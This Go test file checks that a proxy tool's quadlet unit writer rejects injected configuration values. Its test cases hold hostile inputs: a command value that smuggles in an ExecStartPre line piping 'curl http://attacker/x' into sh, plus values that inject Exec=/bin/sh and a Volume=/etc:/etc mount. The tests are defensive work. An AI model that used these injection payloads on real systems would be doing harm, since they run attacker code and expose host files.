package proxyops

import (
	"strings"
	"testing"

	"github.com/gabriel-sousa99/lerd/internal/config"
)

// The quadlet boundary is the second line of defence: config.SaveProxies
// validates on write, but a hand-edited proxies.yaml is loaded without
// validation, so the writer must refuse an injected value itself rather than
// render a unit that runs an attacker's directive on the host.
func TestWriteManagedQuadlet_refusesInjectedValues(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("XDG_DATA_HOME", t.TempDir())

	base := config.Proxy{
		Name: "app", Domains: []string{"app.localhost"},
		Path: "/home/u/app", UpstreamPort: 3000,
		Managed: true, NodeVersion: "22", Command: "npm run dev",
	}

	cases := map[string]func(*config.Proxy){
		"cmd closes Exec= and adds ExecStartPre": func(p *config.Proxy) {
			p.Command = "npm run dev\"\n[Service]\nExecStartPre=/bin/sh -c 'curl http://attacker/x|sh'"
		},
		"node_version redirects Image=": func(p *config.Proxy) { p.NodeVersion = "22-alpine\nExec=/bin/sh" },
		"path adds a second Volume=":    func(p *config.Proxy) { p.Path = "/home/u/app\nVolume=/etc:/etc" },
	}
	for name, mutate := range cases {
		p := base
		mutate(&p)
		if err := WriteManagedQuadlet(p); err == nil {
			t.Errorf("%s: WriteManagedQuadlet() = nil; want rejection", name)
		}
	}
}

// Whatever the writer does accept must not carry an injected directive into the
// rendered unit: every line has to stay one directive.
func TestGenerateManagedQuadlet_noInjectedDirectives(t *testing.T) {
	p := config.Proxy{
		Name: "app", Domains: []string{"app.localhost"},
		Path: "/home/u/app", UpstreamPort: 3000,
		Managed: true, NodeVersion: "22", Command: `npm run dev --flag="x"`,
	}
	got := generateManagedQuadlet(p)
	for _, line := range strings.Split(got, "\n") {
		if strings.HasPrefix(line, "ExecStartPre=") || strings.HasPrefix(line, "ExecStop=") {
			t.Errorf("unexpected directive in rendered unit: %q\nfull unit:\n%s", line, got)
		}
	}
	if !strings.Contains(got, `Exec=sh -lc "npm run dev --flag=\"x\""`) {
		t.Errorf("quoted command must survive escaping; got:\n%s", got)
	}
}
